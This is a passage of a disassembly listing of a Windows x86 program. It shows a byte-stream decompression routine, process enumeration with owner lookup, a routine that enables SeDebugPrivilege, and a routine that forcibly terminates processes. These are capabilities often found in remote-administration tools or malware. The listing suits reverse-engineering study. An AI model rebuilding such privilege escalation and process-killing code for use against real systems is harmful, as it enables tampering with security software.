                lea     edx, [esp+20h+var_18]
                mov     [esi], eax
                mov     [esp+20h+var_18], edi
                call    sub_40D720
                cmp     eax, 1
                jz      short loc_40D430
                or      eax, 0FFFFFFFFh
                jmp     short loc_40D434
; ---------------------------------------------------------------------------

loc_40D430:                             ; CODE XREF: sub_40D3F0+39↑j
                mov     eax, [esp+20h+var_18]

loc_40D434:                             ; CODE XREF: sub_40D3F0+3E↑j
                shl     eax, 8
                or      [esi], eax
                lea     edx, [esp+20h+var_18]
                mov     [esp+20h+var_18], edi
                call    sub_40D720
                cmp     eax, 1
                jz      short loc_40D450
                or      eax, 0FFFFFFFFh
                jmp     short loc_40D454
; ---------------------------------------------------------------------------

loc_40D450:                             ; CODE XREF: sub_40D3F0+59↑j
                mov     eax, [esp+20h+var_18]

loc_40D454:                             ; CODE XREF: sub_40D3F0+5E↑j
                shl     eax, 10h
                or      [esi], eax
                lea     edx, [esp+20h+var_18]
                mov     [esp+20h+var_18], edi
                call    sub_40D720
                cmp     eax, 1
                jz      short loc_40D470
                or      eax, 0FFFFFFFFh
                jmp     short loc_40D474
; ---------------------------------------------------------------------------

loc_40D470:                             ; CODE XREF: sub_40D3F0+79↑j
                mov     eax, [esp+20h+var_18]

loc_40D474:                             ; CODE XREF: sub_40D3F0+7E↑j
                shl     eax, 18h
                or      [esi], eax
                jz      loc_40D639
                push    ebp
                mov     edx, esi
                call    sub_40C950
                push    0FC4h
                lea     eax, [esi+8]
                push    20h
                push    eax
                call    sub_413520
                add     esp, 0Ch
                mov     ebp, 0FC4h
                mov     [esp+24h+var_18], edi
                cmp     [esi], edi
                jbe     loc_40D638
                push    ebx
                lea     esp, [esp+0]

loc_40D4B0:                             ; CODE XREF: sub_40D3F0+241↓j
                mov     eax, esi
                call    sub_40CCF0
                movzx   ebx, ax
                mov     eax, 100h
                cmp     bx, ax
                mov     [esp+28h+var_8], ebx
                jge     short loc_40D530
                mov     eax, [esi+83A8h]
                movsx   ecx, bx
                mov     [esp+28h+Buffer], ecx
                cmp     eax, edi
                jnz     short loc_40D4FD
                mov     ecx, [esi+8388h]
                push    edi             ; lpOverlapped
                lea     edx, [esp+2Ch+NumberOfBytesWritten]
                push    edx             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     eax, [esp+34h+Buffer]
                push    eax             ; lpBuffer
                push    ecx             ; hFile
                mov     [esp+3Ch+NumberOfBytesWritten], edi
                call    ds:WriteFile
                mov     eax, [esp+28h+NumberOfBytesWritten]
                jmp     short loc_40D510
; ---------------------------------------------------------------------------

loc_40D4FD:                             ; CODE XREF: sub_40D3F0+E7↑j
                cmp     eax, 1
                jnz     loc_40D637
                lea     edx, [esp+28h+Buffer]
                push    edx
                call    sub_40D640

loc_40D510:                             ; CODE XREF: sub_40D3F0+10B↑j
                cmp     eax, 1
                jnz     loc_40D637
                movsx   eax, bp
                inc     ebp
                and     ebp, 0FFFh
                inc     [esp+28h+var_18]
                mov     [eax+esi+8], bl
                jmp     loc_40D62B
; ---------------------------------------------------------------------------

loc_40D530:                             ; CODE XREF: sub_40D3F0+D6↑j
                call    sub_40C7C0
                movzx   edi, ax
                movzx   eax, di
                movzx   cx, byte_426400[eax]
                movzx   ax, byte_426500[eax]
                sub     ax, 2
                shl     cx, 6
                movzx   ebx, ax
                movzx   edx, cx
                mov     [esp+28h+Buffer], edx
                test    bx, bx
                jz      short loc_40D57B

loc_40D562:                             ; CODE XREF: sub_40D3F0+189↓j
                add     ebx, 0FFFFh
                call    sub_40C6C0
                lea     ecx, [edi+edi]
                add     ax, cx
                movzx   edi, ax
                test    bx, bx
                jnz     short loc_40D562

loc_40D57B:                             ; CODE XREF: sub_40D3F0+170↑j
                mov     edx, [esp+28h+var_8]
                and     edi, 3Fh
                or      edi, [esp+28h+Buffer]
                add     edx, 0FFFFFF03h
                mov     eax, ebp
                sub     eax, edi
                movzx   ecx, dx
                dec     eax
                xor     edx, edx
                and     eax, 0FFFh
                xor     edi, edi
                cmp     dx, cx
                mov     [esp+28h+var_4], ecx
                jge     loc_40D629
                cwde
                mov     [esp+28h+var_8], eax
                nop

loc_40D5B0:                             ; CODE XREF: sub_40D3F0+237↓j
                mov     ecx, [esp+28h+var_8]
                lea     edx, [edi+ecx]
                and     edx, 0FFFh
                movzx   ax, byte ptr [edx+esi+8]
                movzx   ebx, ax
                mov     eax, [esi+83A8h]
                movsx   ecx, bx
                mov     [esp+28h+Buffer], ecx
                test    eax, eax
                jnz     short loc_40D5FB
                mov     ecx, [esi+8388h]
                push    eax             ; lpOverlapped
                lea     edx, [esp+2Ch+var_C]
                push    edx             ; lpNumberOfBytesWritten
                mov     [esp+30h+var_C], eax
                push    1               ; nNumberOfBytesToWrite
                lea     eax, [esp+34h+Buffer]
                push    eax             ; lpBuffer
                push    ecx             ; hFile
                call    ds:WriteFile
                mov     eax, [esp+28h+var_C]
                jmp     short loc_40D60A
; ---------------------------------------------------------------------------

loc_40D5FB:                             ; CODE XREF: sub_40D3F0+1E5↑j
                cmp     eax, 1
                jnz     short loc_40D637
                lea     edx, [esp+28h+Buffer]
                push    edx
                call    sub_40D640

loc_40D60A:                             ; CODE XREF: sub_40D3F0+209↑j
                cmp     eax, 1
                jnz     short loc_40D637
                inc     [esp+28h+var_18]
                movsx   eax, bp
                inc     ebp
                inc     edi
                and     ebp, 0FFFh
                cmp     di, word ptr [esp+28h+var_4]
                mov     [eax+esi+8], bl
                jl      short loc_40D5B0

loc_40D629:                             ; CODE XREF: sub_40D3F0+1B4↑j
                xor     edi, edi

loc_40D62B:                             ; CODE XREF: sub_40D3F0+13B↑j
                mov     ecx, [esp+28h+var_18]
                cmp     ecx, [esi]
                jb      loc_40D4B0

loc_40D637:                             ; CODE XREF: sub_40D3F0+110↑j
                                        ; sub_40D3F0+123↑j ...
                pop     ebx

loc_40D638:                             ; CODE XREF: sub_40D3F0+B5↑j
                pop     ebp

loc_40D639:                             ; CODE XREF: sub_40D3F0+89↑j
                pop     edi
                pop     esi
                add     esp, 18h
                retn
sub_40D3F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40D640      proc near               ; CODE XREF: sub_40CD50+47↑p
                                        ; sub_40CD50+88↑p ...

arg_0           = dword ptr  4

                mov     eax, [esi+8390h]
                cmp     dword ptr [eax], 0
                jnz     short loc_40D67B
                push    401h
                mov     dword ptr [esi+8398h], 401h
                call    sub_40FE32
                mov     ecx, [esi+8390h]
                mov     [ecx], eax
                mov     edx, [esi+8390h]
                add     esp, 4
                cmp     dword ptr [edx], 0
                jnz     short loc_40D67B
                or      eax, 0FFFFFFFFh
                retn    4
; ---------------------------------------------------------------------------

loc_40D67B:                             ; CODE XREF: sub_40D640+9↑j
                                        ; sub_40D640+33↑j
                mov     eax, [esi+83A4h]
                inc     eax
                cmp     eax, [esi+8398h]
                push    ebx
                push    edi
                jle     short loc_40D6E8
                lea     eax, [eax+eax*2]
                cdq
                sub     eax, edx
                mov     edi, eax
                sar     edi, 1
                add     edi, 400h
                push    edi
                call    sub_40FE32
                mov     ebx, eax
                add     esp, 4
                test    ebx, ebx
                jnz     short loc_40D6B3
                pop     edi
                or      eax, 0FFFFFFFFh
                pop     ebx
                retn    4
; ---------------------------------------------------------------------------

loc_40D6B3:                             ; CODE XREF: sub_40D640+69↑j
                mov     eax, [esi+83A4h]
                mov     ecx, [esi+8390h]
                mov     edx, [ecx]
                push    eax
                push    edx
                push    ebx
                call    sub_414550
                mov     eax, [esi+8390h]
                mov     ecx, [eax]
                push    ecx             ; lpMem
                call    sub_40FD55
                mov     edx, [esi+8390h]
                mov     [edx], ebx
                add     esp, 10h
                mov     [esi+8398h], edi

loc_40D6E8:                             ; CODE XREF: sub_40D640+4A↑j
                mov     eax, [esi+8390h]
                mov     ecx, [eax]
                add     ecx, [esi+83A4h]
                mov     edx, [esp+8+arg_0]
                mov     al, [edx]
                mov     [ecx], al
                inc     dword ptr [esi+83A4h]
                mov     eax, [esi+83A4h]
                mov     ecx, [esi+839Ch]
                pop     edi
                mov     [ecx], eax
                mov     eax, 1
                pop     ebx
                retn    4
sub_40D640      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40D720      proc near               ; CODE XREF: sub_40D3F0+14↑p
                                        ; sub_40D3F0+31↑p ...

NumberOfBytesRead= dword ptr -4

                push    ecx
                mov     eax, [esi+83A8h]
                test    eax, eax
                jnz     short loc_40D74A
                mov     ecx, [esi+8384h]
                push    eax             ; lpOverlapped
                mov     [esp+8+NumberOfBytesRead], eax
                lea     eax, [esp+8+NumberOfBytesRead]
                push    eax             ; lpNumberOfBytesRead
                push    1               ; nNumberOfBytesToRead
                push    edx             ; lpBuffer
                push    ecx             ; hFile
                call    ds:ReadFile
                mov     eax, [esp+4+NumberOfBytesRead]
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_40D74A:                             ; CODE XREF: sub_40D720+9↑j
                cmp     eax, 1
                jnz     short loc_40D789
                mov     ecx, [esi+83A0h]
                push    ebx
                push    edi
                mov     edi, eax
                mov     eax, [esi+8394h]
                lea     ebx, [ecx+1]
                cmp     ebx, eax
                jle     short loc_40D76A
                sub     eax, ecx
                mov     edi, eax

loc_40D76A:                             ; CODE XREF: sub_40D720+44↑j
                mov     eax, [esi+838Ch]
                push    edi
                add     eax, ecx
                push    eax
                push    edx
                call    sub_414550
                add     esp, 0Ch
                add     [esi+83A0h], edi
                mov     eax, edi
                pop     edi
                pop     ebx
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_40D789:                             ; CODE XREF: sub_40D720+2D↑j
                xor     eax, eax
                pop     ecx
                retn
sub_40D720      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


; int __stdcall sub_40D790(char Buffer)
sub_40D790      proc near               ; CODE XREF: sub_40C8C0+2D↑p
                                        ; sub_40C8C0+51↑p

NumberOfBytesWritten= dword ptr -4
Buffer          = byte ptr  4

                push    ecx
                push    esi
                mov     esi, eax
                mov     eax, [esi+83A8h]
                test    eax, eax
                jnz     short loc_40D7C2
                mov     edx, [esi+8388h]
                push    eax             ; lpOverlapped
                mov     [esp+0Ch+NumberOfBytesWritten], eax
                lea     eax, [esp+0Ch+NumberOfBytesWritten]
                push    eax             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     ecx, [esp+14h+Buffer]
                push    ecx             ; lpBuffer
                push    edx             ; hFile
                call    ds:WriteFile
                mov     eax, [esp+8+NumberOfBytesWritten]
                jmp     short loc_40D7D1
; ---------------------------------------------------------------------------

loc_40D7C2:                             ; CODE XREF: sub_40D790+C↑j
                cmp     eax, 1
                jnz     short loc_40D7D6
                lea     eax, [esp+8+Buffer]
                push    eax
                call    sub_40D640

loc_40D7D1:                             ; CODE XREF: sub_40D790+30↑j
                cmp     eax, 1
                jz      short loc_40D7DE

loc_40D7D6:                             ; CODE XREF: sub_40D790+35↑j
                or      eax, 0FFFFFFFFh
                pop     esi
                pop     ecx
                retn    4
; ---------------------------------------------------------------------------

loc_40D7DE:                             ; CODE XREF: sub_40D790+44↑j
                xor     eax, eax
                pop     esi
                pop     ecx
                retn    4
sub_40D790      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40D7F0      proc near               ; CODE XREF: sub_405210+49↑p

arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    ebx
                push    esi
                mov     esi, [esp+8+arg_0]
                xor     ebx, ebx
                mov     [eax+838Ch], esi
                mov     esi, [esp+8+arg_4]
                mov     [eax+8390h], ecx
                mov     [eax+839Ch], esi
                mov     [eax+8394h], edx
                mov     [eax+83A0h], ebx
                mov     [eax+83A4h], ebx
                mov     [ecx], ebx
                mov     ecx, [eax+839Ch]
                mov     [ecx], ebx
                xor     ecx, ecx
                mov     [eax+8376h], cx
                mov     [eax+8378h], bl
                mov     [eax+837Ah], cx
                mov     [eax+837Ch], bl
                mov     [eax], edx
                mov     dword ptr [eax+83A8h], 1
                call    sub_40CD50
                pop     esi
                xor     eax, eax
                pop     ebx
                retn    8
sub_40D7F0      endp

; ---------------------------------------------------------------------------
                align 10h
; START OF FUNCTION CHUNK FOR sub_41EC40
;   ADDITIONAL PARENT FUNCTION sub_41EC80

loc_40D860:                             ; CODE XREF: sub_41EC40+3↓j
                                        ; sub_41EC80+6↓j
                cmp     dword ptr [eax+4], 0
                jnz     short locret_40D86E
                push    0               ; lpMem
                call    sub_40FD55
                pop     ecx

locret_40D86E:                          ; CODE XREF: sub_41EC40-113DC↑j
                retn
; END OF FUNCTION CHUNK FOR sub_41EC40
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40D870      proc near               ; CODE XREF: sub_40D8D0+6B↓p
                                        ; sub_40DD30+B↓p
                cmp     dword ptr [esi+4], 0
                push    edi
                mov     edi, 2000h
                jnz     short loc_40D888
                push    edi
                call    sub_40FE32
                add     esp, 4
                mov     [esi+4], eax

loc_40D888:                             ; CODE XREF: sub_40D870+A↑j
                mov     eax, [esi+4]
                test    eax, eax
                jz      short loc_40D8CD
                push    0
                push    2000h
                push    eax
                mov     eax, [esi]
                push    5
                call    eax
                cmp     eax, 0C0000004h
                jnz     short loc_40D8CD

loc_40D8A4:                             ; CODE XREF: sub_40D870+5B↓j
                mov     ecx, [esi+4]
                add     edi, 2000h
                push    edi             ; dwBytes
                push    ecx             ; lpMem
                call    sub_40FEFC
                add     esp, 8
                push    0
                push    edi
                mov     edx, eax
                push    edx
                mov     [esi+4], eax
                mov     eax, [esi]
                push    5
                call    eax
                cmp     eax, 0C0000004h
                jz      short loc_40D8A4

loc_40D8CD:                             ; CODE XREF: sub_40D870+1D↑j
                                        ; sub_40D870+32↑j
                pop     edi
                retn
sub_40D870      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40D8D0      proc near               ; CODE XREF: sub_405710+85↑p

var_42D         = byte ptr -42Dh
var_42C         = dword ptr -42Ch
Name            = byte ptr -424h
var_320         = byte ptr -320h
var_21C         = byte ptr -21Ch
var_21B         = byte ptr -21Bh
var_11C         = byte ptr -11Ch
MultiByteStr    = byte ptr -114h
var_113         = byte ptr -113h
var_8           = dword ptr -8
arg_0           = dword ptr  4
arg_4           = dword ptr  8

                sub     esp, 430h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+430h+var_8], eax
                mov     eax, [esp+430h+arg_4]
                push    ebp
                mov     ebp, [esp+434h+arg_0]
                push    esi
                push    edi
                push    103h
                lea     ecx, [esp+440h+var_113]
                push    0
                push    ecx
                mov     [esp+448h+var_42C], eax
                mov     [esp+448h+var_42D], 0
                mov     [esp+448h+MultiByteStr], 0
                call    sub_413520
                push    103h
                lea     edx, [esp+44Ch+var_21B]
                push    0
                push    edx
                mov     [esp+454h+var_21C], 0
                call    sub_413520
                add     esp, 18h
                mov     esi, ebp
                call    sub_40D870

loc_40D940:                             ; CODE XREF: sub_40D8D0+1D5↓j
                mov     esi, [ebp+4]
                cmp     dword ptr [esi], 0
                jnz     short loc_40D94D
                mov     [esp+43Ch+var_42D], 1

loc_40D94D:                             ; CODE XREF: sub_40D8D0+76↑j
                push    208h
                lea     eax, [esp+440h+Name]
                push    0
                push    eax
                call    sub_413520
                push    104h
                lea     ecx, [esp+44Ch+var_21C]
                push    0
                push    ecx
                call    sub_413520
                mov     eax, [esi+44h]
                add     esp, 18h
                lea     edx, [esp+43Ch+Name]
                push    edx             ; Name
                push    eax             ; dwProcessId
                call    sub_40DB70
                mov     edx, [ebp+4]
                mov     eax, [edx+3Ch]
                push    0               ; lpUsedDefaultChar
                push    0               ; lpDefaultChar
                push    104h            ; cbMultiByte
                lea     ecx, [esp+450h+var_11C]
                push    ecx             ; lpMultiByteStr
                push    0FFFFFFFFh      ; cchWideChar
                push    eax             ; lpWideCharStr
                push    0               ; dwFlags
                push    0               ; CodePage
                call    ds:WideCharToMultiByte
                mov     edx, [ebp+4]
                mov     eax, [edx+44h]
                lea     ecx, [esp+444h+var_11C]
                push    ecx
                push    eax
                lea     ecx, [esp+228h]
                push    offset aD24s    ; "-%d\t%-24s"
                push    ecx
                call    sub_40E37C
                lea     eax, [esp+230h]
                add     esp, 10h
                mov     ecx, eax

loc_40D9D4:                             ; CODE XREF: sub_40D8D0+109↓j
                mov     dl, [eax]
                inc     eax
                test    dl, dl
                jnz     short loc_40D9D4
                mov     edi, [esp+10h]
                sub     eax, ecx
                mov     esi, ecx
                dec     edi

loc_40D9E4:                             ; CODE XREF: sub_40D8D0+11A↓j
                mov     cl, [edi+1]
                inc     edi
                test    cl, cl
                jnz     short loc_40D9E4
                mov     ecx, eax
                shr     ecx, 2
                rep movsd
                push    104h
                mov     ecx, eax
                lea     edx, [esp+224h]
                and     ecx, 3
                push    0
                push    edx
                rep movsb
                call    sub_413520
                lea     eax, [esp+128h]
                add     esp, 0Ch
                lea     edx, [eax+1]
                jmp     short loc_40DA20
; ---------------------------------------------------------------------------
                align 10h

loc_40DA20:                             ; CODE XREF: sub_40D8D0+14B↑j
                                        ; sub_40D8D0+155↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_40DA20
                sub     eax, edx
                lea     eax, [esp+444h+var_42C]
                push    eax
                jz      short loc_40DA4F
                lea     ecx, [esp+120h]
                push    ecx
                lea     edx, [esp+228h]
                push    offset aSS_0    ; "%s\\%s\n"
                push    edx
                call    sub_40E37C
                add     esp, 10h
                jmp     short loc_40DA64
; ---------------------------------------------------------------------------

loc_40DA4F:                             ; CODE XREF: sub_40D8D0+15E↑j
                lea     ecx, [esp+224h]
                push    offset aS_1     ; "%s\n"
                push    ecx
                call    sub_40E37C
                add     esp, 0Ch

loc_40DA64:                             ; CODE XREF: sub_40D8D0+17D↑j
                lea     eax, [esp+220h]
                mov     ecx, eax
                lea     ecx, [ecx+0]

loc_40DA70:                             ; CODE XREF: sub_40D8D0+1A5↓j
                mov     dl, [eax]
                inc     eax
                test    dl, dl
                jnz     short loc_40DA70
                mov     edi, [esp+10h]
                sub     eax, ecx
                mov     esi, ecx
                dec     edi

loc_40DA80:                             ; CODE XREF: sub_40D8D0+1B6↓j
                mov     cl, [edi+1]
                inc     edi
                test    cl, cl
                jnz     short loc_40DA80
                mov     ecx, eax
                shr     ecx, 2
                rep movsd
                mov     ecx, eax
                and     ecx, 3
                rep movsb
                mov     eax, [ebp+4]
                mov     edx, [eax]
                add     edx, eax
                cmp     byte ptr [esp+0Fh], 0
                mov     [ebp+4], edx
                jz      loc_40D940
                mov     ecx, [esp+434h]
                pop     edi
                pop     esi
                pop     ebp
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 430h
                retn    8
sub_40D8D0      endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40DAD0      proc near               ; CODE XREF: sub_40DCD0+9↓p
                                        ; sub_40DCD0+48↓p

TokenHandle     = dword ptr -20h
Luid            = _LUID ptr -1Ch
NewState        = _TOKEN_PRIVILEGES ptr -14h

                sub     esp, 20h
                push    esi
                mov     esi, eax
                lea     eax, [esp+24h+TokenHandle]
                push    eax             ; TokenHandle
                push    20028h          ; DesiredAccess
                call    ds:GetCurrentProcess
                push    eax             ; ProcessHandle
                call    ds:OpenProcessToken
                test    eax, eax
                jnz     short loc_40DAF6
                pop     esi
                add     esp, 20h
                retn
; ---------------------------------------------------------------------------

loc_40DAF6:                             ; CODE XREF: sub_40DAD0+1F↑j
                lea     ecx, [esp+24h+Luid]
                push    ecx             ; lpLuid
                push    offset aSedebugprivile ; "SeDebugPrivilege"
                push    0               ; lpSystemName
                call    ds:LookupPrivilegeValueA
                test    eax, eax
                jnz     short loc_40DB16
                mov     eax, 1
                pop     esi
                add     esp, 20h
                retn
; ---------------------------------------------------------------------------

loc_40DB16:                             ; CODE XREF: sub_40DAD0+3A↑j
                mov     edx, [esp+24h+Luid.LowPart]
                mov     eax, [esp+24h+Luid.HighPart]
                push    0               ; ReturnLength
                push    0               ; PreviousState
                push    0               ; BufferLength
                lea     ecx, [esp+30h+NewState]
                neg     esi
                push    ecx             ; NewState
                mov     [esp+34h+NewState.Privileges.Luid.LowPart], edx
                mov     edx, [esp+34h+TokenHandle]
                sbb     esi, esi
                push    0               ; DisableAllPrivileges
                and     esi, 2
                push    edx             ; TokenHandle
                mov     [esp+3Ch+NewState.PrivilegeCount], 1
                mov     [esp+3Ch+NewState.Privileges.Luid.HighPart], eax
                mov     [esp+3Ch+NewState.Privileges.Attributes], esi
                call    ds:AdjustTokenPrivileges
                mov     eax, [esp+24h+TokenHandle]
                push    eax             ; hObject
                call    ds:CloseHandle
                call    ds:GetLastError
                neg     eax
                sbb     eax, eax
                inc     eax
                pop     esi
                add     esp, 20h
                retn
sub_40DAD0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40DB70(DWORD dwProcessId, LPSTR Name)
sub_40DB70      proc near               ; CODE XREF: sub_40D8D0+AE↑p

peUse           = dword ptr -34h
cchName         = dword ptr -30h
cchReferencedDomainName= dword ptr -2Ch
var_28          = dword ptr -28h
TokenHandle     = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
dwProcessId     = dword ptr  8
Name            = dword ptr  0Ch

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    offset stru_423390
                push    offset SEH_40DB70
                mov     eax, large fs:0
                push    eax
                sub     esp, 24h
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     [ebp+ms_exc.registration.ScopeTable], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+ms_exc.registration]
                mov     large fs:0, eax
                mov     [ebp+ms_exc.old_esp], esp
                xor     ebx, ebx
                xor     edi, edi
                mov     [ebp+var_1C], edi
                mov     [ebp+var_20], ebx
                mov     [ebp+TokenHandle], ebx
                mov     [ebp+var_28], ebx
                mov     [ebp+ms_exc.registration.TryLevel], ebx
                mov     eax, [ebp+dwProcessId]
                push    eax             ; dwProcessId
                push    ebx             ; bInheritHandle
                push    400h            ; dwDesiredAccess
                call    ds:OpenProcess
                mov     esi, eax
                mov     [ebp+var_20], esi
                cmp     esi, ebx
                jz      loc_40DC74
                lea     ecx, [ebp+TokenHandle]
                push    ecx             ; TokenHandle
                push    8               ; DesiredAccess
                push    esi             ; ProcessHandle
                call    ds:OpenProcessToken
                mov     edi, eax
                mov     [ebp+var_1C], edi
                cmp     edi, ebx
                jz      loc_40DC74
                mov     [ebp+dwProcessId], ebx
                lea     edx, [ebp+dwProcessId]
                push    edx             ; ReturnLength
                push    ebx             ; TokenInformationLength
                push    ebx             ; TokenInformation
                push    1               ; TokenInformationClass
                mov     eax, [ebp+TokenHandle]
                push    eax             ; TokenHandle
                mov     edi, ds:GetTokenInformation
                call    edi ; GetTokenInformation
                mov     [ebp+var_1C], eax
                mov     ecx, [ebp+dwProcessId]
                lea     edx, [ecx+ecx]
                push    edx
                call    sub_40F94F
                add     esp, 4
                mov     esi, eax
                mov     [ebp+var_28], esi
                mov     eax, [ebp+dwProcessId]
                add     eax, eax
                mov     [ebp+dwProcessId], eax
                lea     ecx, [ebp+dwProcessId]
                push    ecx             ; ReturnLength
                push    eax             ; TokenInformationLength
                push    esi             ; TokenInformation
                push    1               ; TokenInformationClass
                mov     edx, [ebp+TokenHandle]
                push    edx             ; TokenHandle
                call    edi ; GetTokenInformation
                mov     edi, eax
                mov     [ebp+var_1C], edi
                call    ds:GetLastError
                cmp     edi, ebx
                jz      short loc_40DC71
                mov     eax, 104h
                mov     [ebp+cchName], eax
                mov     [ebp+cchReferencedDomainName], eax
                lea     eax, [ebp+peUse]
                push    eax             ; peUse
                lea     ecx, [ebp+cchReferencedDomainName]
                push    ecx             ; cchReferencedDomainName
                mov     eax, [ebp+Name]
                lea     edx, [eax+104h]
                push    edx             ; ReferencedDomainName
                lea     ecx, [ebp+cchName]
                push    ecx             ; cchName
                push    eax             ; Name
                mov     edx, [esi]
                push    edx             ; Sid
                push    ebx             ; lpSystemName
                call    ds:LookupAccountSidA
                mov     edi, eax
                mov     [ebp+var_1C], edi

loc_40DC71:                             ; CODE XREF: sub_40DB70+CE↑j
                mov     esi, [ebp+var_20]

loc_40DC74:                             ; CODE XREF: sub_40DB70+5D↑j
                                        ; sub_40DB70+77↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40DC8A
; ---------------------------------------------------------------------------

loc_40DC80:                             ; CODE XREF: sub_40DB70+159↓j
                jmp     short loc_40DC8A
; ---------------------------------------------------------------------------

loc_40DC82:                             ; DATA XREF: .rdata:stru_423390↓o
                xor     ebx, ebx
                mov     edi, [ebp+var_1C]
                mov     esi, [ebp+var_20]

loc_40DC8A:                             ; CODE XREF: sub_40DB70+10B↑j
                                        ; sub_40DB70:loc_40DC80↑j
                cmp     esi, ebx
                jz      short loc_40DC95
                push    esi             ; hObject
                call    ds:CloseHandle

loc_40DC95:                             ; CODE XREF: sub_40DB70+11C↑j
                mov     eax, [ebp+TokenHandle]
                cmp     eax, ebx
                jz      short loc_40DCA3
                push    eax             ; hObject
                call    ds:CloseHandle

loc_40DCA3:                             ; CODE XREF: sub_40DB70+12A↑j
                mov     eax, [ebp+var_28]
                cmp     eax, ebx
                jz      short loc_40DCB3
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_40DCB3:                             ; CODE XREF: sub_40DB70+138↑j
                mov     esp, [ebp+ms_exc.old_esp]
                mov     eax, edi
                mov     ecx, [ebp+ms_exc.registration.Next]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    8
sub_40DB70      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


; int __stdcall sub_40DCD0(DWORD dwProcessId)
sub_40DCD0      proc near               ; CODE XREF: sub_405850+A7↑p

dwProcessId     = dword ptr  4

                push    esi
                push    edi
                mov     edi, 1
                mov     eax, edi
                call    sub_40DAD0
                mov     eax, [esp+8+dwProcessId]
                push    eax             ; dwProcessId
                push    edi             ; bInheritHandle
                push    1FFFFFh         ; dwDesiredAccess
                call    ds:OpenProcess
                mov     esi, eax
                test    esi, esi
                jz      short loc_40DD0F
                push    0               ; uExitCode
                push    esi             ; hProcess
                call    ds:TerminateProcess
                mov     edi, eax
                test    edi, edi
                jnz     short loc_40DD0F
                push    1F4h            ; dwMilliseconds
                call    ds:Sleep

loc_40DD0F:                             ; CODE XREF: sub_40DCD0+23↑j
                                        ; sub_40DCD0+32↑j
                push    esi             ; hObject
                call    ds:CloseHandle
                xor     eax, eax
                call    sub_40DAD0
                mov     eax, edi
                pop     edi
                pop     esi
                retn    4
sub_40DCD0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40DD30      proc near               ; CODE XREF: sub_405850+9F↑p

lpWideCharStr   = dword ptr -44h
TokenHandle     = dword ptr -40h
hObject         = dword ptr -3Ch
var_38          = dword ptr -38h
Luid            = _LUID ptr -34h
var_2C          = _LUID ptr -2Ch
NewState        = _TOKEN_PRIVILEGES ptr -24h
var_14          = _TOKEN_PRIVILEGES ptr -14h

                sub     esp, 44h
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     esi, ecx
                mov     edi, eax
                call    sub_40D870
                xor     ebp, ebp
                push    208h
                mov     [esp+58h+var_38], ebp
                call    sub_40F94F
                mov     ebx, ds:MultiByteToWideChar
                add     esp, 4
                push    ebp             ; cchWideChar
                push    ebp             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                push    edi             ; lpMultiByteStr
                push    ebp             ; dwFlags
                push    ebp             ; CodePage
                mov     [esp+6Ch+lpWideCharStr], eax
                call    ebx ; MultiByteToWideChar
                push    eax             ; cchWideChar
                mov     eax, [esp+58h+lpWideCharStr]
                push    eax             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                push    edi             ; lpMultiByteStr
                push    ebp             ; dwFlags
                push    ebp             ; CodePage
                call    ebx ; MultiByteToWideChar

loc_40DD73:                             ; CODE XREF: sub_40DD30+1B9↓j
                mov     eax, [esi+4]
                cmp     dword ptr [eax], 0
                jnz     short loc_40DD83
                mov     [esp+54h+var_38], 1

loc_40DD83:                             ; CODE XREF: sub_40DD30+49↑j
                cmp     dword ptr [eax+3Ch], 0
                jnz     short loc_40DD90
                mov     ecx, [eax]
                add     ecx, eax
                mov     [esi+4], ecx

loc_40DD90:                             ; CODE XREF: sub_40DD30+57↑j
                mov     edx, [esi+4]
                mov     eax, [edx+3Ch]
                mov     ecx, [esp+54h+lpWideCharStr]
                push    4
                push    eax
                push    ecx
                call    sub_41E4AC
                add     esp, 0Ch
                test    eax, eax
                jnz     loc_40DEDA
                mov     edx, [esi+4]
                mov     edi, [edx+44h]
                lea     ebx, [eax+1]
                lea     eax, [esp+54h+TokenHandle]
                push    eax             ; TokenHandle
                push    20028h          ; DesiredAccess
                call    ds:GetCurrentProcess
                mov     ebp, ds:OpenProcessToken
                push    eax             ; ProcessHandle
                call    ebp ; OpenProcessToken
                test    eax, eax
                jz      short loc_40DE2F
                lea     ecx, [esp+54h+Luid]
                push    ecx             ; lpLuid
                push    offset aSedebugprivile ; "SeDebugPrivilege"
                push    0               ; lpSystemName
                call    ds:LookupPrivilegeValueA
                test    eax, eax
                jz      short loc_40DE2F
                mov     edx, [esp+54h+Luid.LowPart]
                mov     eax, [esp+54h+Luid.HighPart]
